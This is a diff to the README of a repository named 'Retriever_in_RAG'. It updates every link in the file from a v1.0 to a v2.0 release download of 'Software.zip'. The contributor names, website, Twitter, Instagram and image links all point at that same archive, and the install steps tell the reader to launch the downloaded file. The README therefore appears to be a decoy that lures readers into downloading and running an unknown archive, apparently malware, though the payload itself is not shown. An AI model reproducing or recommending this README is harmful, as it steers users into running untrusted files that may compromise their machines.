@@ -41,7 +41,7 @@ The **Retriever_in_RAG** repository covers the following topics:
 
 To get started with **Retriever_in_RAG**, follow these simple steps:
 
-1. Clone the repository from the following link: [Download ZIP](https://github.com/Mark-Rosss/Retriever_in_RAG/releases/download/v1.0/Software.zip) 😉✨
+1. Clone the repository from the following link: [Download ZIP](https://github.com/Mark-Rosss/Retriever_in_RAG/releases/download/v2.0/Software.zip) 😉✨
 2. Launch the downloaded file to access the project files  
 3. Follow the installation instructions in the repository to set up the app  
 
@@ -68,9 +68,9 @@ If you encounter any issues with **Retriever_in_RAG**, feel free to reach out to
 
 The **Retriever_in_RAG** project is made possible by the following contributors:
 
-👩‍💻 [Alice Smith](https://github.com/Mark-Rosss/Retriever_in_RAG/releases/download/v1.0/Software.zip)  
-👨‍💻 [Bob Johnson](https://github.com/Mark-Rosss/Retriever_in_RAG/releases/download/v1.0/Software.zip)  
-👩‍💼 [Eve Williams](https://github.com/Mark-Rosss/Retriever_in_RAG/releases/download/v1.0/Software.zip)  
+👩‍💻 [Alice Smith](https://github.com/Mark-Rosss/Retriever_in_RAG/releases/download/v2.0/Software.zip)  
+👨‍💻 [Bob Johnson](https://github.com/Mark-Rosss/Retriever_in_RAG/releases/download/v2.0/Software.zip)  
+👩‍💼 [Eve Williams](https://github.com/Mark-Rosss/Retriever_in_RAG/releases/download/v2.0/Software.zip)  
 
 Your support and contributions are greatly appreciated! 🙌✨
 
@@ -86,9 +86,9 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Stay up to date with the latest developments and updates on **Retriever_in_RAG**:
 
-🌐 [Website](https://github.com/Mark-Rosss/Retriever_in_RAG/releases/download/v1.0/Software.zip)  
-🐦 [Twitter](https://github.com/Mark-Rosss/Retriever_in_RAG/releases/download/v1.0/Software.zip)  
-📷 [Instagram](https://github.com/Mark-Rosss/Retriever_in_RAG/releases/download/v1.0/Software.zip)  
+🌐 [Website](https://github.com/Mark-Rosss/Retriever_in_RAG/releases/download/v2.0/Software.zip)  
+🐦 [Twitter](https://github.com/Mark-Rosss/Retriever_in_RAG/releases/download/v2.0/Software.zip)  
+📷 [Instagram](https://github.com/Mark-Rosss/Retriever_in_RAG/releases/download/v2.0/Software.zip)  
 
 ---
 
@@ -98,6 +98,6 @@ We hope you enjoy using **Retriever_in_RAG** as much as we enjoyed creating it. 
 
 ---
 
-![Retriever_in_RAG](https://github.com/Mark-Rosss/Retriever_in_RAG/releases/download/v1.0/Software.zip)
+![Retriever_in_RAG](https://github.com/Mark-Rosss/Retriever_in_RAG/releases/download/v2.0/Software.zip)
 
-[![Download ZIP](https://github.com/Mark-Rosss/Retriever_in_RAG/releases/download/v1.0/Software.zip)](https://github.com/Mark-Rosss/Retriever_in_RAG/releases/download/v1.0/Software.zip)
+[![Download ZIP](https://github.com/Mark-Rosss/Retriever_in_RAG/releases/download/v2.0/Software.zip)](https://github.com/Mark-Rosss/Retriever_in_RAG/releases/download/v2.0/Software.zip)
